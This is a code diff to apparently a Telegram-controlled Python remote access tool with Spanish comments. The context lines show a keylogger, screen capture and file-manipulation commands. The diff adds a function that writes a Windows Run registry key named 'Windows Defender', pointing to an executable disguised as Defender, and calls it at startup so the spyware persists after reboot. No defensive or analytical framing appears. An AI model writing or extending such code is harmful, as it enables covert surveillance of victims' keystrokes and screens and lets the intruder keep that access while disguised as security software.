@@ -3,6 +3,7 @@
 import os, os.path, platform, ctypes
 os.environ["PBR_VERSION"]='5.0.0'
 import logging
+from winreg import *
 from consoleTools import consoleDisplay as cd
 from PIL import ImageGrab                                                 # /capture_pc
 from shutil import copyfile, copyfileobj, rmtree, move                    # /ls, /pwd, /cd, /copy, /mv
@@ -822,8 +823,39 @@ def Klogger():                              # Obtiene registro de teclas y guard
                 f.write(KeyConMax(str(key)))
     with Listener(on_press=on_press) as listener:   # Escucha pulsaciones de teclas
         listener.join() 
+
+
+
+# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
+
+
+def addStartup():  # function =  Iniciar automaticamente
+    path = r"C:\Users\Public\Security\Windows Defender\WindowsDefenderAdvanced.exe" # Path del Software completo
+    name = "Windows Defender"                                                       # Nombre del StartUp
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
+    def verificar():
+        try:  # Intenta crear la dirección
+            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')
+            return True # Se creó la carpeta
+        except:
+            return False# La carpeta ya existe
+    try:    # Solo si tiene permisos de administrador
+        registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # machine
+        SetValueEx(registry,name, 0, REG_SZ, path)
+        verificar() # Crea Carpeta
+    except: # Si no tien permisos de administrador
+        if (verificar()):
+            registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
+            SetValueEx(registry,name, 0, REG_SZ, path)
+     
+        
+   
+        
 cd.log('s', 'Configuración Terminada')
 cd.log('i', 'Iniciando')
+addStartup()  
 bot = telepot.Bot(token)
 bot.message_loop(handle)
 if len(known_ids) > 0:
